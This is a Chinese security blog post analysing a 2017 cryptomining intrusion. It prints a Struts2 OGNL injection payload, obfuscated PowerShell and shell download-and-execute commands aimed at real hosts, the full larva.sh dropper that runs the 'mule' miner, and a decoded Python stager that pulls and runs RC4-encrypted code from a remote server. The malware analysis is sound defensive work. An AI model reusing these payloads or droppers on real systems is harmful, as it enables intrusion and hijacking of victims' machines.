@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>powershell植入mule挖矿程序事件分析 | SY0U&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="近期看到的一条日志内容： 1173.212.217.181 - - [20/Oct/2017:16:54:11 +0000] &quot;GET / HTTP/1.1&quot; [] 200 - [-] [%&amp;#123;(#_=&quot;multipart/form-data&quot;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberA">
+<meta property="og:type" content="article">
+<meta property="og:title" content="powershell植入mule挖矿程序事件分析">
+<meta property="og:url" content="http://wsygoogol.github.io/2018/01/10/powershell植入mule挖矿程序事件分析/index.html">
+<meta property="og:site_name" content="SY0U&#39;s Blog">
+<meta property="og:description" content="近期看到的一条日志内容： 1173.212.217.181 - - [20/Oct/2017:16:54:11 +0000] &quot;GET / HTTP/1.1&quot; [] 200 - [-] [%&amp;#123;(#_=&quot;multipart/form-data&quot;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberA">
+<meta property="og:image" content="h:/gitBlog/themes/landscape/source/upload_image/745.png">
+<meta property="og:image" content="h:/gitBlog/themes/landscape/source/upload_image/15-3-43.png">
+<meta property="og:image" content="h:/gitBlog/themes/landscape/source/upload_image/15-1-29.png">
+<meta property="og:updated_time" content="2018-01-11T06:02:30.331Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="powershell植入mule挖矿程序事件分析">
+<meta name="twitter:description" content="近期看到的一条日志内容： 1173.212.217.181 - - [20/Oct/2017:16:54:11 +0000] &quot;GET / HTTP/1.1&quot; [] 200 - [-] [%&amp;#123;(#_=&quot;multipart/form-data&quot;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberA">
+<meta name="twitter:image" content="h:/gitBlog/themes/landscape/source/upload_image/745.png">
+  
+    <link rel="alternate" href="/atom.xml" title="SY0U&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">SY0U&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-powershell植入mule挖矿程序事件分析" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/01/10/powershell植入mule挖矿程序事件分析/" class="article-date">
+  <time datetime="2018-01-10T12:24:56.000Z" itemprop="datePublished">2018-01-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      powershell植入mule挖矿程序事件分析
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>近期看到的一条日志内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">173.212.217.181 - - [20/Oct/2017:16:54:11 +0000] <span class="string">"GET / HTTP/1.1"</span> [] 200 - [-] [%&#123;(<span class="comment">#_="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#wcmd="C:\\\"Windows\\\"System32\\\"WindowsPowerShell\\\"v1.0\\\"powershell.exe -WindowStyle Hidden -encode JABlAD0AJwBLAEEAQQB1AEEAQwBnAEEASQBnAEIANwBBAEQAQQBBAGYAUQBCADcAQQBEAEUAQQBmAFEAQgA3AEEARABJAEEAZgBRAEEAaQBBAEMAMABBAFoAZwBBAG4AQQBFADQAQQBKAHcAQQBzAEEAQwBnAEEASQBnAEIANwBBAEQARQBBAGYAUQBCADcAQQBEAEEAQQBmAFEAQQBpAEEAQwAwAEEAWgBnAEEAbgBBAEgAYwBBAEwAUQBCAFAAQQBHAEkAQQBKAHcAQQBzAEEAQwBjAEEAWgBRAEEAbgBBAEMAawBBAEwAQQBBAG8AQQBDAEkAQQBlAHcAQQB3AEEASAAwAEEAZQB3AEEAeABBAEgAMABBAEkAZwBBAHQAQQBHAFkAQQBJAEEAQQBuAEEARwBvAEEAWgBRAEEAbgBBAEMAdwBBAEoAdwBCAGoAQQBIAFEAQQBKAHcAQQBwAEEAQwBrAEEASQBBAEEAbwBBAEMASQBBAGUAdwBBADAAQQBIADAAQQBlAHcAQQB6AEEASAAwAEEAZQB3AEEAeQBBAEgAMABBAGUAdwBBAHgAQQBIADAAQQBlAHcAQQB3AEEASAAwAEEASQBnAEEAZwBBAEMAMABBAFoAZwBBAGcAQQBDAGMAQQBkAEEAQQBuAEEAQwB3AEEASwBBAEEAaQBBAEgAcwBBAE0AUQBCADkAQQBIAHMAQQBNAEEAQgA5AEEAQwBJAEEASQBBAEEAdABBAEcAWQBBAEoAdwBCAGwAQQBHADQAQQBKAHcAQQBzAEEAQwBjAEEAUQB3AEIAcwBBAEcAawBBAEoAdwBBAHAAQQBDAHcAQQBKAHcAQgBYAEEARwBVAEEAWQBnAEEAbgBBAEMAdwBBAEoAdwBCAGwAQQBIAFEAQQBMAGcAQQBuAEEAQwB3AEEASwBBAEEAaQBBAEgAcwBBAE0AUQBCADkAQQBIAHMAQQBNAEEAQgA5AEEASABzAEEATQBnAEIAOQBBAEMASQBBAEkAQQBBAHQAQQBHAFkAQQBKAHcAQgAwAEEARwBVAEEAYgBRAEEAdQBBAEMAYwBBAEwAQQBBAG4AQQBGAE0AQQBlAFEAQgB6AEEAQwBjAEEATABBAEEAbgBBAEUANABBAEoAdwBBAHAAQQBDAGsAQQBLAFEAQQB1AEEAQwBnAEEASQBnAEIANwBBAEQAQQBBAGYAUQBCADcAQQBEAEUAQQBmAFEAQgA3AEEARABNAEEAZgBRAEIANwBBAEQASQBBAGYAUQBBAGkAQQBDAEEAQQBMAFEAQgBtAEEAQwBjAEEAUgBBAEEAbgBBAEMAdwBBAEsAQQBBAGkAQQBIAHMAQQBNAFEAQgA5AEEASABzAEEATQBnAEIAOQBBAEgAcwBBAE0AQQBCADkAQQBDAEkAQQBMAFEAQgBtAEEAQwBBAEEASgB3AEIAaABBAEcAUQBBAFUAdwBCADAAQQBDAGMAQQBMAEEAQQBuAEEARwA4AEEAZAB3AEEAbgBBAEMAdwBBAEoAdwBCAHUAQQBHAHcAQQBiAHcAQQBuAEEAQwBrAEEATABBAEEAbgBBAEcANABBAFoAdwBBAG4AQQBDAHcAQQBKAHcAQgB5AEEARwBrAEEASgB3AEEAcABBAEMANABBAEkAZwBCAHAAQQBFADQAQQBWAGcAQgBnAEEARwA4AEEAWQBBAEIATABBAEcAVQBBAEkAZwBBAG8AQQBDAGcAQQBJAGcAQgA3AEEARABJAEEAZgBRAEIANwBBAEQARQBBAGYAUQBCADcAQQBEAE0AQQBmAFEAQgA3AEEARABVAEEAZgBRAEIANwBBAEQAQQBBAGYAUQBCADcAQQBEAFkAQQBmAFEAQgA3AEEARABRAEEAZgBRAEEAaQBBAEMAMABBAFoAZwBBAG8AQQBDAEkAQQBlAHcAQQB3AEEASAAwAEEAZQB3AEEAeABBAEgAMABBAEkAZwBBAGcAQQBDADAAQQBaAGcAQQBnAEEAQwBjAEEAYgBnAEEAdgBBAEMAYwBBAEwAQQBBAG4AQQBIAE0AQQBZAHcAQQBuAEEAQwBrAEEATABBAEEAbgBBAEgAUQBBAGQAQQBBAG4AQQBDAHcAQQBKAHcAQgBvAEEAQwBjAEEATABBAEEAbwBBAEMASQBBAGUAdwBBAHgAQQBIADAAQQBlAHcAQQB3AEEASAAwAEEASQBnAEEAZwBBAEMAMABBAFoAZwBBAGcAQQBDAGMAQQBMAHcAQgBoAEEAQwBjAEEATABBAEEAbgBBAEgAQQBBAE8AZwBBAHYAQQBDAGMAQQBLAFEAQQBzAEEAQwBjAEEATQBRAEEAbgBBAEMAdwBBAEsAQQBBAGkAQQBIAHMAQQBNAEEAQgA5AEEASABzAEEATQBnAEIAOQBBAEgAcwBBAE0AUQBCADkAQQBDAEkAQQBMAFEAQgBtAEEAQwBBAEEASgB3AEIAcABBAEgAUQBBAEoAdwBBAHMAQQBDAGMAQQBaAFEAQQB1AEEASABjAEEAYQBRAEEAbgBBAEMAdwBBAEoAdwBBADMAQQBHAFUAQQBKAHcAQQBwAEEAQwB3AEEASwBBAEEAaQBBAEgAcwBBAE0AQQBCADkAQQBIAHMAQQBNAFEAQgA5AEEAQwBJAEEASQBBAEEAdABBAEcAWQBBAEkAQQBBAG4AQQBIAFkAQQBMAGcAQgB3AEEAQwBjAEEATABBAEEAbgBBAEgATQBBAEoAdwBBAHAAQQBDAGsAQQBLAFEAQgA4AEEAQwA0AEEASwBBAEEAaQBBAEgAcwBBAE0AQQBCADkAQQBIAHMAQQBNAFEAQgA5AEEAQwBJAEEATABRAEIAbQBBAEMAQQBBAEoAdwBCAHAAQQBHAFUAQQBKAHcAQQBzAEEAQwBjAEEAZQBBAEEAbgBBAEMAawBBACcAOwAgAHMAdABhAHIAdAAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgACcALQBlAG4AYwBvAGQAZQAnACwAIAAkAGUA").(#lcmd="nohup sh -c '(sh &lt; /dev/tcp/149.255.35.91/23546 &gt; /dev/null || curl -s http://149.255.35.91/larva.sh|sh &gt; /dev/null || wget http://149.255.35.91/larva.sh -O /var/tmp/larva.sh) &amp;&amp; chmod +x /var/tmp/larva.sh &amp;&amp; (nohup /var/tmp/larva.sh &amp;) &amp;&amp; sleep 1 &amp;&amp; rm -f /var/tmp/larva.sh' &amp;").(#iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win"))).(#cmds=(#iswin?&#123;"cmd.exe","/c",#wcmd&#125;:&#123;"/bin/bash","-c",#lcmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.write(" ok5026 ".getBytes())).(#ros.flush())&#125;] 0.448 220</span></div></pre></td></tr></table></figure>
+<p>关键部分时一段编码后的powershell命令，base解码之后得到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$e</span>=<span class="string">'KAAuACgAIgB7ADAAfQB7ADEAfQB7ADIAfQAiAC0AZgAnAE4AJwAsACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAnAHcALQBPAGIAJwAsACcAZQAnACkALAAoACIAewAwAH0AewAxAH0AIgAtAGYAIAAnAGoAZQAnACwAJwBjAHQAJwApACkAIAAoACIAewA0AH0AewAzAH0AewAyAH0AewAxAH0AewAwAH0AIgAgAC0AZgAgACcAdAAnACwAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAJwBlAG4AJwAsACcAQwBsAGkAJwApACwAJwBXAGUAYgAnACwAJwBlAHQALgAnACwAKAAiAHsAMQB9AHsAMAB9AHsAMgB9ACIAIAAtAGYAJwB0AGUAbQAuACcALAAnAFMAeQBzACcALAAnAE4AJwApACkAKQAuACgAIgB7ADAAfQB7ADEAfQB7ADMAfQB7ADIAfQAiACAALQBmACcARAAnACwAKAAiAHsAMQB9AHsAMgB9AHsAMAB9ACIALQBmACAAJwBhAGQAUwB0ACcALAAnAG8AdwAnACwAJwBuAGwAbwAnACkALAAnAG4AZwAnACwAJwByAGkAJwApAC4AIgBpAE4AVgBgAG8AYABLAGUAIgAoACgAIgB7ADIAfQB7ADEAfQB7ADMAfQB7ADUAfQB7ADAAfQB7ADYAfQB7ADQAfQAiAC0AZgAoACIAewAwAH0AewAxAH0AIgAgAC0AZgAgACcAbgAvACcALAAnAHMAYwAnACkALAAnAHQAdAAnACwAJwBoACcALAAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAgACcALwBhACcALAAnAHAAOgAvACcAKQAsACcAMQAnACwAKAAiAHsAMAB9AHsAMgB9AHsAMQB9ACIALQBmACAAJwBpAHQAJwAsACcAZQAuAHcAaQAnACwAJwA3AGUAJwApACwAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAIAAnAHYALgBwACcALAAnAHMAJwApACkAKQB8AC4AKAAiAHsAMAB9AHsAMQB9ACIALQBmACAAJwBpAGUAJwAsACcAeAAnACkA'</span>; start C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden <span class="string">'-encode'</span>, <span class="variable">$e</span></div></pre></td></tr></table></figure>
+<p>其中变量e再次进行了编码，于是再解码一次：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(.(<span class="string">"&#123;0&#125;&#123;1&#125;&#123;2&#125;"</span>-f<span class="string">'N'</span>,(<span class="string">"&#123;1&#125;&#123;0&#125;"</span>-f<span class="string">'w-Ob'</span>,<span class="string">'e'</span>),(<span class="string">"&#123;0&#125;&#123;1&#125;"</span>-f <span class="string">'je'</span>,<span class="string">'ct'</span>)) (<span class="string">"&#123;4&#125;&#123;3&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;"</span> -f <span class="string">'t'</span>,(<span class="string">"&#123;1&#125;&#123;0&#125;"</span> -f<span class="string">'en'</span>,<span class="string">'Cli'</span>),<span class="string">'Web'</span>,<span class="string">'et.'</span>,(<span class="string">"&#123;1&#125;&#123;0&#125;&#123;2&#125;"</span> -f<span class="string">'tem.'</span>,<span class="string">'Sys'</span>,<span class="string">'N'</span>))).(<span class="string">"&#123;0&#125;&#123;1&#125;&#123;3&#125;&#123;2&#125;"</span> -f<span class="string">'D'</span>,(<span class="string">"&#123;1&#125;&#123;2&#125;&#123;0&#125;"</span>-f <span class="string">'adSt'</span>,<span class="string">'ow'</span>,<span class="string">'nlo'</span>),<span class="string">'ng'</span>,<span class="string">'ri'</span>).<span class="string">"iNV`o`Ke"</span>((<span class="string">"&#123;2&#125;&#123;1&#125;&#123;3&#125;&#123;5&#125;&#123;0&#125;&#123;6&#125;&#123;4&#125;"</span>-f(<span class="string">"&#123;0&#125;&#123;1&#125;"</span> -f <span class="string">'n/'</span>,<span class="string">'sc'</span>),<span class="string">'tt'</span>,<span class="string">'h'</span>,(<span class="string">"&#123;1&#125;&#123;0&#125;"</span> -f <span class="string">'/a'</span>,<span class="string">'p:/'</span>),<span class="string">'1'</span>,(<span class="string">"&#123;0&#125;&#123;2&#125;&#123;1&#125;"</span>-f <span class="string">'it'</span>,<span class="string">'e.wi'</span>,<span class="string">'7e'</span>),(<span class="string">"&#123;0&#125;&#123;1&#125;"</span> -f <span class="string">'v.p'</span>,<span class="string">'s'</span>)))|.(<span class="string">"&#123;0&#125;&#123;1&#125;"</span>-f <span class="string">'ie'</span>,<span class="string">'x'</span>)</div></pre></td></tr></table></figure>
+<p>可读性还是很差，经过判断这应该对字符进行了换位操作，打乱了顺序逃避检测，于是把字符进行重新组合，得到了这样一条命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iex (New-Object SystemNet.WebClient).DownloadString(<span class="string">'http://ait7ee.win/scv.ps1'</span>)</div></pre></td></tr></table></figure>
+<p>所以一开始的命令经过两次解码和一次字符换位后完整命令如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden <span class="string">'-encode'</span>, <span class="string">'iex (New-Object SystemNet.WebClient).DownloadString('</span>http://ait7ee.win/scv.ps1<span class="string">')'</span></div></pre></td></tr></table></figure>
+<p>可以看到powershell执行的是下载操作,下载的文件地址是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ait7ee.win/scv.ps1</div></pre></td></tr></table></figure>
+<p>把这个文件下载下来，发现是一个经过高度混淆加密的ps脚本，具体内容没有分析出来，猜测是用于安装挖矿程序及其服务的。</p>
+<p>在脚本里找到这样一个地址：</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\745.png" alt="745"></p>
+<p>直接访问   <a href="http://ait7ee.win/orbital_command.ps1" target="_blank" rel="external">http://ait7ee.win/orbital_command.ps1</a> 下载到一个新的脚本，简单分析之后发现是powersploit渗透框架下的一个模块<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="external">Invoke-ReflectivePEInjection.ps1</a>，功能是远程加载exe或dll并执行</p>
+<p>链接：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="external">https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</a></p>
+<p>但是其中最后部分又经过了加密.</p>
+<p>下面还有一段命令：</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\15-3-43.png" alt="15-3-43"></p>
+<p>从<strong>149.255.35.91</strong>上下载<strong>larva.sh</strong>文件并执行，之后删除这个文件</p>
+<p><strong>larva.sh</strong> 内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line">psarg=<span class="string">""</span></div><div class="line"><span class="keyword">if</span> [[ -n `ps -lf` ]]; <span class="keyword">then</span></div><div class="line">psarg=<span class="string">"-lf"</span></div><div class="line"><span class="keyword">elif</span> [[ -n `ps -au` ]]; <span class="keyword">then</span></div><div class="line">psarg=<span class="string">"-au"</span></div><div class="line"><span class="keyword">fi</span></div><div class="line">mutex=<span class="string">"21914"</span></div><div class="line">mutex_exist=<span class="string">''</span></div><div class="line"><span class="keyword">if</span> [[ <span class="variable">$psarg</span> ]]; <span class="keyword">then</span></div><div class="line"><span class="keyword">if</span> [[ `ps <span class="variable">$psarg</span> | grep -v grep | grep -c <span class="variable">$mutex</span> ` -gt 0 ]]; <span class="keyword">then</span></div><div class="line">mutex_exist=1</div><div class="line"><span class="keyword">else</span></div><div class="line">mutex_exist=<span class="string">''</span></div><div class="line"><span class="keyword">fi</span></div><div class="line"><span class="keyword">fi</span></div><div class="line"><span class="keyword">if</span> [[ <span class="variable">$mutex_exist</span> -gt 0 ]]; <span class="keyword">then</span></div><div class="line"><span class="built_in">echo</span> mutex exist, quiting script</div><div class="line"><span class="built_in">exit</span></div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">echo</span> mutex not exist, starting a new one</div><div class="line">sleep 800.<span class="variable">$mutex</span> &amp;</div><div class="line"><span class="keyword">fi</span></div><div class="line">sh -c <span class="string">"(cat &lt; /dev/tcp/ait7ee.win/23546 &gt; /tmp/mule || wget http://ait7ee.win/mule -O /tmp/mule || curl -s http://ait7ee.win/mule -o /tmp/mule) &amp;&amp; chmod +x /tmp/mule &amp;&amp; (nohup /tmp/mule &amp;) &amp;&amp; sleep 1 &amp;&amp; rm -f /tmp/mule"</span> &amp;</div><div class="line">rm -f /tmp/larva.sh</div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">tcp_download</span></span>()</div><div class="line">&#123;</div><div class="line">FileServer=<span class="variable">$1</span></div><div class="line">Port=<span class="variable">$2</span></div><div class="line">Target=<span class="variable">$3</span></div><div class="line">cat &lt; /dev/tcp/<span class="variable">$FileServer</span>/<span class="variable">$Port</span> &gt; <span class="variable">$Target</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">http_download</span></span>()</div><div class="line">&#123;</div><div class="line">Url=<span class="variable">$1</span></div><div class="line">Target=<span class="variable">$2</span></div><div class="line">wget <span class="variable">$Url</span> -O <span class="variable">$Target</span> || curl -s <span class="variable">$Url</span> -o <span class="variable">$Target</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">download</span></span>()</div><div class="line">&#123;</div><div class="line">FileServer=<span class="variable">$1</span></div><div class="line">Port=<span class="variable">$2</span></div><div class="line">FileName=<span class="variable">$3</span></div><div class="line">Target=<span class="variable">$4</span></div><div class="line">tcp_download <span class="variable">$FileServer</span> <span class="variable">$Port</span> <span class="variable">$Target</span> || http_download http://<span class="variable">$FileServer</span>/<span class="variable">$FileName</span> <span class="variable">$Target</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">download_and_execute</span></span>()</div><div class="line">&#123;</div><div class="line">FileServer=<span class="variable">$1</span></div><div class="line">Port=<span class="variable">$2</span></div><div class="line">FileName=<span class="variable">$3</span></div><div class="line">Target=<span class="variable">$4</span></div><div class="line">download <span class="variable">$FileServer</span> <span class="variable">$Port</span> <span class="variable">$FileName</span> <span class="variable">$Target</span></div><div class="line">chmod +x <span class="variable">$Target</span></div><div class="line">nohup <span class="variable">$Target</span> &amp;</div><div class="line">sleep 1</div><div class="line">rm -f <span class="variable">$Target</span></div><div class="line">&#125;</div><div class="line"><span class="built_in">echo</span> <span class="string">"from subprocess import *;p = Popen('python',stdin=PIPE); p.stdin.write(\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly80Ni4yMS4xNDcuMTMzOjgwMDEnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPW84MkZ5MU11QWE5M0lMVnYwZS9PQ29qb2M2ST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKydlfU9CdStqRENOP152bVZnOzoxLSFMeG4jR2M8PXs5Syc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSk='));\");"</span> | python</div><div class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></div><div class="line">sleep 3600.<span class="variable">$mutex</span> &amp;</div><div class="line">sleep 3600.<span class="variable">$mutex</span></div><div class="line">download_and_execute ait7ee.win 23547 mule /tmp/mule</div><div class="line">pkill stratum</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
+<p>主要功能还是从主机下载文件并执行</p>
+<p>其中的域名和ip跟上面解码出来的是同一台主机</p>
+<p>脚本里还有一段编码后的命令，它的明文如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">import sys;import re, subprocess;cmd = <span class="string">"ps -ef | grep Little\ Snitch | grep -v grep"</span></div><div class="line">ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)</div><div class="line">out = ps.stdout.read()</div><div class="line">ps.stdout.close()</div><div class="line"><span class="keyword">if</span> re.search(<span class="string">"Little Snitch"</span>, out):</div><div class="line">sys.exit()</div><div class="line">import urllib2;</div><div class="line">UA=<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'</span>;server=<span class="string">'http://46.21.147.133:8001'</span>;t=<span class="string">'/login/process.php'</span>;req=urllib2.Request(server+t);</div><div class="line">req.add_header(<span class="string">'User-Agent'</span>,UA);</div><div class="line">req.add_header(<span class="string">'Cookie'</span>,<span class="string">"session=o82Fy1MuAa93ILVv0e/OCojoc6I="</span>);</div><div class="line">proxy = urllib2.ProxyHandler();</div><div class="line">o = urllib2.build_opener(proxy);</div><div class="line">urllib2.install_opener(o);</div><div class="line">a=urllib2.urlopen(req).<span class="built_in">read</span>();</div><div class="line">IV=a[0:4];data=a[4:];key=IV+<span class="string">'e&#125;OBu+jDCN?^vmVg;:1-!Lxn#Gc&lt;=&#123;9K'</span>;S,j,out=range(256),0,[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(256):</div><div class="line">j=(j+S[i]+ord(key[i%len(key)]))%256</div><div class="line">S[i],S[j]=S[j],S[i]</div><div class="line">i=j=0</div><div class="line"><span class="keyword">for</span> char <span class="keyword">in</span> data:</div><div class="line">i=(i+1)%256</div><div class="line">j=(j+S[i])%256</div><div class="line">S[i],S[j]=S[j],S[i]</div><div class="line">out.append(chr(ord(char)^S[(S[i]+S[j])%256]))</div><div class="line"><span class="built_in">exec</span>(<span class="string">''</span>.join(out))</div></pre></td></tr></table></figure>
+<p>其中<strong><a href="http://46.21.147.133:8001" target="_blank" rel="external">http://46.21.147.133:8001</a></strong>这个地址已经无法访问，所以不清楚process.php内容是什么</p>
+<p>这次攻击涉及到的样本有 <strong>larva.sh</strong>，<strong>mule</strong>，<strong>scv.ps1</strong></p>
